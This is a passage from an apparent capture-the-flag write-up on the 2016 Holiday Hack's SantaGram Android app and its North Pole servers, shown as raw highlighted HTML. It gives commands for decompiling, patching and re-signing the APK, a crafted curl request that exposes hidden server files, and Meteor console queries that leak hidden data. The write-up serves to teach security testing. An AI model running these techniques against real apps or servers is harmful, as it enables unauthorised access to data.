synthetic */</span> <span class=\"n\">JSONObject</span> <span class=\"n\">f2408a</span><span class=\"o\">;</span>\n\t<span class=\"kd\">final</span> <span class=\"cm\">/* synthetic */</span> <span class=\"n\">EditProfile</span> <span class=\"n\">f2409b</span><span class=\"o\">;</span>\n\n\t<span class=\"n\">C08591</span><span class=\"o\">(</span><span class=\"n\">EditProfile</span> <span class=\"n\">editProfile</span><span class=\"o\">,</span> <span class=\"n\">JSONObject</span> <span class=\"n\">jSONObject</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n\t\t<span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">f2409b</span> <span class=\"o\">=</span> <span class=\"n\">editProfile</span><span class=\"o\">;</span>\n\t\t<span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">f2408a</span> <span class=\"o\">=</span> <span class=\"n\">jSONObject</span><span class=\"o\">;</span>\n\t<span class=\"o\">}</span>\n\n\t<span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">run</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n                <span class=\"c1\">// dev.northpolewonderland.com</span>\n\t\t<span class=\"n\">C0987b</span><span class=\"o\">.</span><span class=\"na\">m4776a</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">f2409b</span><span class=\"o\">.</span><span class=\"na\">getString</span><span class=\"o\">(</span><span class=\"mi\">2131165213</span><span class=\"o\">),</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">f2408a</span><span class=\"o\">);</span> \n\t<span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre> \n</figure> \n<p>Looks like when <code class=\"highlighter-rouge\">run()</code> is called on a <code class=\"highlighter-rouge\">C08591</code> object, we execute something related to this host, potentially sending traffic to it. Let’s look for where this object is used elsewhere in the code.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">getString</span><span class=\"o\">(</span><span class=\"mi\">2131165214</span><span class=\"o\">).</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"s\">\"true\"</span><span class=\"o\">))</span> <span class=\"o\">{</span>\n\t<span class=\"n\">Log</span><span class=\"o\">.</span><span class=\"na\">i</span><span class=\"o\">(</span><span class=\"n\">getString</span><span class=\"o\">(</span><span class=\"mi\">2131165204</span><span class=\"o\">),</span> <span class=\"s\">\"Remote debug logging is Enabled\"</span><span class=\"o\">);</span>\n\t<span class=\"n\">z</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n<span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n\t<span class=\"n\">Log</span><span class=\"o\">.</span><span class=\"na\">i</span><span class=\"o\">(</span><span class=\"n\">getString</span><span class=\"o\">(</span><span class=\"mi\">2131165204</span><span class=\"o\">),</span> <span class=\"s\">\"Remote debug logging is Disabled\"</span><span class=\"o\">);</span>\n\t<span class=\"n\">z</span> <span class=\"o\">=</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n<span class=\"o\">...</span>\n<span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">z</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">try</span> <span class=\"o\">{</span>\n        <span class=\"n\">JSONObject</span> <span class=\"n\">jSONObject</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">JSONObject</span><span class=\"o\">();</span>\n        <span class=\"n\">jSONObject</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">\"date\"</span><span class=\"o\">,</span> <span class=\"k\">new</span> <span class=\"n\">SimpleDateFormat</span><span class=\"o\">(</span><span class=\"s\">\"yyyyMMddHHmmssZ\"</span><span class=\"o\">).</span><span class=\"na\">format</span><span class=\"o\">(</span><span class=\"n\">Calendar</span><span class=\"o\">.</span><span class=\"na\">getInstance</span><span class=\"o\">().</span><span class=\"na\">getTime</span><span class=\"o\">()));</span>\n        <span class=\"n\">jSONObject</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">\"udid\"</span><span class=\"o\">,</span> <span class=\"n\">Secure</span><span class=\"o\">.</span><span class=\"na\">getString</span><span class=\"o\">(</span><span class=\"n\">getContentResolver</span><span class=\"o\">(),</span> <span class=\"s\">\"android_id\"</span><span class=\"o\">));</span>\n        <span class=\"n\">jSONObject</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">\"debug\"</span><span class=\"o\">,</span> <span class=\"n\">getClass</span><span class=\"o\">().</span><span class=\"na\">getCanonicalName</span><span class=\"o\">()</span> <span class=\"o\">+</span> <span class=\"s\">\", \"</span> <span class=\"o\">+</span> <span class=\"n\">getClass</span><span class=\"o\">().</span><span class=\"na\">getSimpleName</span><span class=\"o\">());</span>\n        <span class=\"n\">jSONObject</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">\"freemem\"</span><span class=\"o\">,</span> <span class=\"n\">Runtime</span><span class=\"o\">.</span><span class=\"na\">getRuntime</span><span class=\"o\">().</span><span class=\"na\">totalMemory</span><span class=\"o\">()</span> <span class=\"o\">-</span> <span class=\"n\">Runtime</span><span class=\"o\">.</span><span class=\"na\">getRuntime</span><span class=\"o\">().</span><span class=\"na\">freeMemory</span><span class=\"o\">());</span>\n        <span class=\"c1\">// Calls a function related to dev.northpolewonderland.com</span>\n        <span class=\"k\">new</span> <span class=\"nf\">Thread</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">C8590</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">,</span> <span class=\"n\">jSONObject</span><span class=\"o\">)).</span><span class=\"na\">start</span><span class=\"o\">();</span> \n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre> \n</figure> \n<p>Ok, so this is interesting.. We only create a <code class=\"highlighter-rouge\">C08590</code> object if <code class=\"highlighter-rouge\">z</code> is true and <code class=\"highlighter-rouge\">z</code> is true only when string <code class=\"highlighter-rouge\">2131165214</code> equals true. Let’s look for this new valuable string in our source.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">ctfhacker</span> at <span class=\"mi\">barberpole</span> in <span class=\"k\">~/SantaGram_4.2_source_from_JADX</span> on <span class=\"kc\">master</span>\n$ ag 2131165214\ncom/northpolewonderland/santagram/EditProfile.java\n207:        if (getString(2131165214).equals(\"true\")) {\n</code></pre> \n</figure> \n<p>Hmm.. there doesn’t appear to be another use of this id number. Maybe the number is referenced via its hex value?</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">ctfhacker</span> at <span class=\"mi\">barberpole</span> in <span class=\"k\">~/SantaGram_4.2_source_from_JADX</span> on <span class=\"kc\">master</span>\n$ python -c \"print(hex(2131165214))\"\n<span class=\"sb\">0x7f07001e</span>\n\n<span class=\"n\">ctfhacker</span> at <span class=\"mi\">barberpole</span> in <span class=\"k\">~/SantaGram_4.2_source_from_JADX</span> on <span class=\"kc\">master</span>\n$ ag <span class=\"sb\"> 0x7f07001e</span>\nres/values/public.xml\n506:    &lt;public type=\"string\" name=\"debug_data_enabled\" id=\"<span class=\"sb\">0x7f07001e</span>\" /&gt;\n</code></pre> \n</figure> \n<p>There we go. This string is referenced by “debug_data_enabled”. And where is this string located?</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">ctfhacker</span> at <span class=\"mi\">barberpole</span> in <span class=\"k\">SantaGram_4.2_source_from_JADX</span> on <span class=\"kc\">master</span>\n$ ag debug_data_enabled\nres/values/strings.xml\n33:    &lt;\\string name=\"debug_data_enabled\"&gt;false&lt;\\/string&gt;\n</code></pre> \n</figure> \n<p>So ultimately, a value from <code class=\"highlighter-rouge\">strings.xml</code> is referenced in order to create traffic to <code class=\"highlighter-rouge\">dev.northpolewonderland.com</code>. In order to test this theory, we need to patch the APK and set this string from <code class=\"highlighter-rouge\">false</code> to <code class=\"highlighter-rouge\">true</code> and see if any new traffic is generated from the app.</p> \n<p>One great choice for testing Android applications is <a href=\"https://www.genymotion.com\">Genymotion</a>. Genymotion leverages Virtualbox to provide Android virtual machines. Once we have our application installed on the VM, we can use <a href=\"https://www.charlesproxy.com\">Charles</a> in order to catch the various API calls. In order for the VM to proxy through Charles, we need to setup the proxy. Note: Your IP will be your host Virtualbox IP.</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/genymotion-proxy.gif\" alt=\"genymotion-proxy.gif\" /></p> \n<p>Now that we have our Genymotion VM proxying through Charles.. We need to patch the APK to enable the debug feature.</p> \n<p>We can take our decoded APK (but not decompiled) and modify the debug string from <code class=\"highlighter-rouge\">false</code> to <code class=\"highlighter-rouge\">true</code>. We can then rebulid the APK into a patched version.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">apktool d SantaGram_3.2.apk\nvim SantaGram_3.2/res/values/strings.xml --- <span class=\"sb\">false</span> -&gt; <span class=\"sb\">true</span>\napktool b -o SantaGram_patched.apk SantaGram_3.2 \n</code></pre> \n</figure> \n<p>In order for the APK to be installed, we need to sign our patched copy. In order to do this we need our own keystore. Once we have our keystore, we can then sign our APK.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">keytool -genkey -v -keystore my.keystore -alias anyalias -keyalg RSA -validity 9999\njarsigner -sigalg MD5withRSA -digestalg SHA1 -keystore my.keystore SantaGram_patched.apk anyalias </code></pre> \n</figure> \n<p>Now that we have our patched, signed APK, we can use <code class=\"highlighter-rouge\">adb</code> (Android Debugger) to install the APK into our VM.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">adb install SantaGram_patched.apk </code></pre> \n</figure> \n<p>Now that we have our app installed, let’s test our path to see if <code class=\"highlighter-rouge\">dev.northpolewonderland.com</code> shows up in Charles.</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/genymotion-charles.gif\" alt=\"genymotion-charles.gif\" /></p> \n<p>One useful feature of Charlesproxy is to be able to grab the request in cURL form and use that as a test bed.</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/charles.gif\" alt=\"charles.gif\" /></p> \n<p>Taking a look at the request, we notice that it is simply JSON.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-json\" data-lang=\"json\"><span class=\"p\">{</span><span class=\"s2\">\"date\"</span><span class=\"p\">:</span><span class=\"s2\">\"20161225202908-0500\"</span><span class=\"p\">,</span><span class=\"w\">\n </span><span class=\"s2\">\"udid\"</span><span class=\"p\">:</span><span class=\"s2\">\"10b0207e60c0ef17\"</span><span class=\"p\">,</span><span class=\"w\">\n </span><span class=\"s2\">\"debug\"</span><span class=\"p\">:</span><span class=\"s2\">\"com.northpolewonderland.santagram.EditProfile, EditProfile\"</span><span class=\"p\">,</span><span class=\"w\">\n </span><span class=\"s2\">\"freemem\"</span><span class=\"p\">:</span><span class=\"mi\">94754948</span><span class=\"p\">}</span></code></pre> \n</figure> \n<p>Looking at the request, there appears to be a filename given back.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-json\" data-lang=\"json\"><span class=\"p\">{</span><span class=\"s2\">\"date\"</span><span class=\"p\">:</span><span class=\"s2\">\"20161226015603\"</span><span class=\"p\">,</span><span class=\"w\">\n </span><span class=\"s2\">\"status\"</span><span class=\"p\">:</span><span class=\"s2\">\"OK\"</span><span class=\"p\">,</span><span class=\"w\">\n </span><span class=\"s2\">\"filename\"</span><span class=\"p\">:</span><span class=\"s2\">\"debug-20161226015603-0.txt\"</span><span class=\"p\">,</span><span class=\"w\">\n </span><span class=\"s2\">\"verbose\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">false</span><span class=\"p\">}</span></code></pre> \n</figure> \n<p>Is this a new file that appears on the server?</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">$ wget http://dev.northpolewonderland.com/<span class=\"sb\">debug-20161226015603-0.txt</span>\n--2016-12-25 20:00:45--  http://dev.northpolewonderland.com/debug-20161226015603-0.txt\nResolving dev.northpolewonderland.com (dev.northpolewonderland.com)... 35.184.63.245\nConnecting to dev.northpolewonderland.com (dev.northpolewonderland.com)|35.184.63.245|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 144 [text/plain]\nSaving to: ‘debug-20161226015603-0.txt’\n\ndebug-20161226015603-0.txt   100%[==============================================&gt;]     144  --.-KB/s    in 0s      \n\n2016-12-25 20:00:45 (10.9 MB/s) - ‘<span class=\"sb\">debug-20161226015603-0.txt</span>’ saved [144/144]\n</code></pre> \n</figure> \n<p>So yes, that file is available on the server. There is also a new field returned in the response: <code class=\"highlighter-rouge\">\"verbose\": false</code>. Could we send this field in our initial request, but setting verbose to true?</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">curl -H 'Content-Type: application/json' -H 'User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.0; Custom Phone - 5.0.0 - API 21 - 768x1280 Build/LRX21M)' -H 'Host: dev.northpolewonderland.com' --data-binary '{\"date\":\"20161225202909-0500\",\"udid\":\"10b0207e60c0ef17\",\"debug\":\"com.northpolewonderland.santagram.EditProfile, EditProfile\",\"freemem\":123,<span class=\"sb\">\"verbose\":true</span>}' --compressed 'http://dev.northpolewonderland.com/index.php'\n</code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-json\" data-lang=\"json\"><span class=\"p\">{</span><span class=\"w\">\n    </span><span class=\"s2\">\"date\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"20161226021020\"</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">\"date.len\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">14</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">\"status\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"OK\"</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">\"status.len\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"2\"</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">\"filename\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"debug-20161226021020-0.txt\"</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">\"filename.len\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">26</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">\"request\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"w\">\n        </span><span class=\"s2\">\"date\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"20161225202909-0500\"</span><span class=\"p\">,</span><span class=\"w\">\n        </span><span class=\"s2\">\"udid\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"10b0207e60c0ef17\"</span><span class=\"p\">,</span><span class=\"w\">\n        </span><span class=\"s2\">\"debug\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"com.northpolewonderland.santagram.EditProfile, EditProfile\"</span><span class=\"p\">,</span><span class=\"w\">\n        </span><span class=\"s2\">\"freemem\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">123</span><span class=\"p\">,</span><span class=\"w\">\n        </span><span class=\"s2\">\"verbose\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">true</span><span class=\"w\">\n    </span><span class=\"p\">},</span><span class=\"w\">\n    </span><span class=\"s2\">\"files\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"debug-20161224235959-0.mp3\"</span><span class=\"p\">,</span><span class=\"w\">\n              </span><span class=\"s2\">\"debug-20161226020206-0.txt\"</span><span class=\"p\">,</span><span class=\"w\"> \n              </span><span class=\"s2\">\"debug-20161226021020-0.txt\"</span><span class=\"p\">,</span><span class=\"w\"> \n              </span><span class=\"s2\">\"index.php\"</span><span class=\"p\">]</span><span class=\"w\">\n</span><span class=\"p\">}</span></code></pre> \n</figure> \n<p>Holy cow! There are a ton more filenames given in this response. Also, wait.. what is that first file?</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">debug-20161224235959-0.mp3\n</code></pre> \n</figure> \n<p>Looks like we have our audio file from dev! Simply <code class=\"highlighter-rouge\">wget</code> this file and we can move on to the next server!</p> \n<h3 id=\"74-the-banner-ad-server\">7.4) The Banner Ad Server</h3> \n<p>Ports relevant for the Banner Ad Server (ads.northpolewonderland.com):</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>PORT      STATE    SERVICE\n80/tcp    open     http\n</code></pre> \n </div> \n</div> \n<p>Quickly looking through the source of the web page, we see <a href=\"https://www.Meteor.com\">Meteor</a> references everywhere. Having not dealt with Meteor before, let’s get our hands dirty with some javascript and Meteor.</p> \n<p>To begin this journey, let’s begin figuring out what we can access in Meteor. The Developer Console in the browser is our best friend in this case.</p> \n<p>After exploring the <code class=\"highlighter-rouge\">Meteor</code> object in the console, we find that <code class=\"highlighter-rouge\">Meteor.routes</code> is an array of the hooked routes. Let’s print all of the URLs on each route to see what we are dealing with.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-javascript\" data-lang=\"javascript\"><span class=\"k\">for</span><span class=\"p\">(</span><span class=\"kd\">var</span> <span class=\"nx\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nx\">i</span> <span class=\"o\">&lt;</span> <span class=\"nx\">Router</span><span class=\"p\">.</span><span class=\"nx\">routes</span><span class=\"p\">.</span><span class=\"nx\">length</span><span class=\"p\">;</span> <span class=\"nx\">i</span><span class=\"o\">++</span><span class=\"p\">){</span> \n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">Router</span><span class=\"p\">.</span><span class=\"nx\">routes</span><span class=\"p\">[</span><span class=\"nx\">i</span><span class=\"p\">].</span><span class=\"nx\">url</span><span class=\"p\">())</span>\n<span class=\"p\">}</span></code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">http://ads.northpolewonderland.com/\nhttp://ads.northpolewonderland.com/login\nhttp://ads.northpolewonderland.com/register\nhttp://ads.northpolewonderland.com/aboutus\nhttp://ads.northpolewonderland.com/null\nhttp://ads.northpolewonderland.com/manage\nhttp://ads.northpolewonderland.com/create\nhttp://ads.northpolewonderland.com/campaign/create\nhttp://ads.northpolewonderland.com/campaign/review\nhttp://ads.northpolewonderland.com/campaign/share\nhttp://ads.northpolewonderland.com/admin/quotes\n</code></pre> \n</figure> \n<p>Great great, now we have URLs. Let’s look at what collections we have access to in our Meteor environment (again in the javascript console).</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-javascript\" data-lang=\"javascript\"><span class=\"nx\">Meteor</span><span class=\"p\">.</span><span class=\"nx\">connection</span><span class=\"p\">.</span><span class=\"nx\">_mongo_livedata_collections</span>\n\n<span class=\"nx\">home_quotes</span> <span class=\"p\">:</span> <span class=\"nx\">h</span>\n<span class=\"nx\">meteor_accounts_loginServiceConfiguration</span> <span class=\"p\">:</span> <span class=\"nx\">h</span>\n<span class=\"nx\">meteor_autoupdate_clientVersions</span> <span class=\"p\">:</span> <span class=\"nx\">h</span>\n<span class=\"nx\">roles</span> <span class=\"p\">:</span> <span class=\"nx\">h</span>\n<span class=\"nx\">satisfaction</span> <span class=\"p\">:</span> <span class=\"nx\">h</span>\n<span class=\"nx\">users</span> <span class=\"p\">:</span> <span class=\"nx\">h</span></code></pre> \n</figure> \n<p>Our goal now is to traverse each URL and look at each collection via the following idiom.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-javascript\" data-lang=\"javascript\"><span class=\"nx\">Collection</span><span class=\"p\">.</span><span class=\"nx\">find</span><span class=\"p\">().</span><span class=\"nx\">fetch</span><span class=\"p\">()</span></code></pre> \n</figure> \n<p>This dirty work leads to the following combination:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"sb\">URL: http://ads.northpolewonderland.com/admin/quotes</span>\n</code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-javascript\" data-lang=\"javascript\"><span class=\"nx\">HomeQuotes</span><span class=\"p\">.</span><span class=\"nx\">find</span><span class=\"p\">().</span><span class=\"nx\">fetch</span><span class=\"p\">()</span>\n<span class=\"p\">[</span><span class=\"nb\">Object</span><span class=\"p\">,</span> <span class=\"nb\">Object</span><span class=\"p\">,</span> <span class=\"nb\">Object</span><span class=\"p\">,</span> <span class=\"nb\">Object</span><span class=\"p\">,</span> \n\t<span class=\"nx\">Object_id</span><span class=\"p\">:</span> <span class=\"s2\">\"zPR5TpxB5mcAH3pYk\"</span>\n    <span class=\"nx\">audio</span><span class=\"p\">:</span> <span class=\"s2\">\"/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3\"</span>\n    <span class=\"nx\">hidden</span><span class=\"p\">:</span> <span class=\"nx\">trueindex</span><span class=\"p\">:</span> <span class=\"mi\">4</span>\n    <span class=\"nx\">quote</span><span class=\"p\">:</span> <span class=\"s2\">\"Just Ad It!\"</span>\n    <span class=\"nx\">__proto__</span><span class=\"p\">:</span> <span class=\"nb\">Object</span><span class=\"p\">]</span></code></pre> \n</figure> \n<p>Looks like this particular Object has an “audio” attribute. By simply using <code class=\"highlighter-rouge\">wget</code>, we can download this audio file and put this server behind us. Onward..</p> \n<h3 id=\"75-the-uncaught-exception-handler-server\">7.5) The Uncaught Exception Handler Server</h3> \n<p>Ports relevant for the Exception Server (ex.northpolewonderland.com):</p> \n<div class=\"highlighter-rouge\"> \n <div class=\"highlight\"> \n  <pre class=\"highlight\"><code>PORT      STATE    SERVICE\n80/tcp    open     http\n</code></pre> \n </div> \n</div> \n<p>Let’s begin again by looking through the APK source code for our target server.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">ctfhacker</span> at <span class=\"mi\">barberpole</span> in <span class=\"k\">SantaGram_4.2_source_from_JADX</span> on <span class=\"kc\">master</span>\n$ ag <span class=\"sb\">exhandler_url</span>\nres/values/strings.xml\n35:    \n   \n   <string name=\"exhandler_url\">\n    \n    http://ex.northpolewonderland.com/exception.php\n   \n   </string>\n\nres/values/public.xml\n508:    &lt;\\public type=\"string\" name=\"<span class=\"sb\">exhandler_url</span>\" id=\"<span class=\"sb\">0x7f07001f</span>\" /&gt;\n</code></pre> \n</figure> \n<p>We know from the debug server that strings are referenced by decimal rather than hex. Let’s search for the decimal value rather than the hex.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">ctfhacker</span> at <span class=\"mi\">barberpole</span> in <span class=\"k\">SantaGram_4.2_source_from_JADX</span> on <span class=\"kc\">master</span>*\n$ python -c \"print(<span class=\"sb\">0x7f070020</span>)\"\n<span class=\"sb\">2131165216</span>\n\n<span class=\"n\">ctfhacker</span> at <span class=\"mi\">barberpole</span> in <span class=\"k\">SantaGram_4.2_source_from_JADX</span> on <span class=\"kc\">master</span>*\n$ ag <span class=\"sb\">2131165216</span>\ncom/northpolewonderland/santagram/C0987b.java\n59:  C0987b.m4776a(this.f2621a.getString(<span class=\"sb\">2131165216</span>), this.f2622b);\n138: Log.i(context.getString(2131165204), \"...\" + context.getString(2131165216));\n162: Log.e(f2623a, \"...\" + context.getString(2131165216) + \" -- \" + e.getMessage());\n\ncom/northpolewonderland/santagram/SplashScreen.java\n88:  C0987b.m4776a(this.f2617b.getString(2131165216), this.f2616a);\n145: Log.i(getString(2131165204), \"...\" + getString(2131165216));\n169: Log.e(TAG, \"...\" + getString(2131165216) + \" -- \" + e.getMessage());\n</code></pre> \n</figure> \n<p>Let’s see the context of the use of the string in <code class=\"highlighter-rouge\">C0987b.java</code>.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\">$ ag -C10 2131165216 com/northpolewonderland/santagram/C0987b.java     \n</code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"mi\">136</span><span class=\"o\">-</span>    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">m4775a</span><span class=\"o\">(</span><span class=\"n\">Context</span> <span class=\"n\">context</span><span class=\"o\">,</span> <span class=\"n\">Throwable</span> <span class=\"n\">th</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n<span class=\"mi\">137</span><span class=\"o\">-</span>        <span class=\"n\">JSONObject</span> <span class=\"n\">jSONObject</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">JSONObject</span><span class=\"o\">();</span>\n<span class=\"mi\">138</span><span class=\"o\">:</span>        <span class=\"n\">Log</span><span class=\"o\">.</span><span class=\"na\">i</span><span class=\"o\">(</span><span class=\"n\">context</span><span class=\"o\">.</span><span class=\"na\">getString</span><span class=\"o\">(</span><span class=\"mi\">2131165204</span><span class=\"o\">),</span> <span class=\"s\">\"Exception: sending exception data to \"</span> <span class=\"o\">+</span> <span class=\"n\">context</span><span class=\"o\">.</span><span class=\"na\">getString</span><span class=\"o\">(</span><span class=\"mi\">2131165216</span><span class=\"o\">));</span>\n<span class=\"mi\">139</span><span class=\"o\">-</span>        <span class=\"k\">try</span> <span class=\"o\">{</span>\n<span class=\"mi\">140</span><span class=\"o\">-</span>            <span class=\"n\">jSONObject</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">\"operation\"</span><span class=\"o\">,</span> <span class=\"s\">\"WriteCrashDump\"</span><span class=\"o\">);</span>\n<span class=\"mi\">141</span><span class=\"o\">-</span>            <span class=\"n\">JSONObject</span> <span class=\"n\">jSONObject2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">JSONObject</span><span class=\"o\">();</span>\n<span class=\"mi\">142</span><span class=\"o\">-</span>            <span class=\"n\">jSONObject2</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">\"message\"</span><span class=\"o\">,</span> <span class=\"n\">th</span><span class=\"o\">.</span><span class=\"na\">getMessage</span><span class=\"o\">());</span>\n<span class=\"mi\">143</span><span class=\"o\">-</span>            <span class=\"n\">jSONObject2</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">\"lmessage\"</span><span class=\"o\">,</span> <span class=\"n\">th</span><span class=\"o\">.</span><span class=\"na\">getLocalizedMessage</span><span class=\"o\">());</span>\n<span class=\"mi\">144</span><span class=\"o\">-</span>            <span class=\"n\">jSONObject2</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">\"strace\"</span><span class=\"o\">,</span> <span class=\"n\">Log</span><span class=\"o\">.</span><span class=\"na\">getStackTraceString</span><span class=\"o\">(</span><span class=\"n\">th</span><span class=\"o\">));</span>\n<span class=\"mi\">145</span><span class=\"o\">-</span>            <span class=\"n\">jSONObject2</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">\"model\"</span><span class=\"o\">,</span> <span class=\"n\">Build</span><span class=\"o\">.</span><span class=\"na\">MODEL</span><span class=\"o\">);</span>\n<span class=\"mi\">146</span><span class=\"o\">-</span>            <span class=\"n\">jSONObject2</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">\"sdkint\"</span><span class=\"o\">,</span> <span class=\"n\">String</span><span class=\"o\">.</span><span class=\"na\">valueOf</span><span class=\"o\">(</span><span class=\"n\">VERSION</span><span class=\"o\">.</span><span class=\"na\">SDK_INT</span><span class=\"o\">));</span>\n<span class=\"mi\">147</span><span class=\"o\">-</span>            <span class=\"n\">jSONObject2</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">\"device\"</span><span class=\"o\">,</span> <span class=\"n\">Build</span><span class=\"o\">.</span><span class=\"na\">DEVICE</span><span class=\"o\">);</span>\n<span class=\"mi\">148</span><span class=\"o\">-</span>            <span class=\"n\">jSONObject2</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">\"product\"</span><span class=\"o\">,</span> <span class=\"n\">Build</span><span class=\"o\">.</span><span class=\"na\">PRODUCT</span><span class=\"o\">);</span>\n<span class=\"o\">--</span>\n<span class=\"mi\">152</span><span class=\"o\">-</span>            <span class=\"n\">jSONObject2</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">\"vmheapszlimit\"</span><span class=\"o\">,</span> <span class=\"n\">String</span><span class=\"o\">.</span><span class=\"na\">valueOf</span><span class=\"o\">(</span><span class=\"n\">Runtime</span><span class=\"o\">.</span><span class=\"na\">getRuntime</span><span class=\"o\">().</span><span class=\"na\">maxMemory</span><span class=\"o\">()));</span>\n<span class=\"mi\">153</span><span class=\"o\">-</span>            <span class=\"n\">jSONObject2</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">\"natallocmem\"</span><span class=\"o\">,</span> <span class=\"n\">String</span><span class=\"o\">.</span><span class=\"na\">valueOf</span><span class=\"o\">(</span><span class=\"n\">Debug</span><span 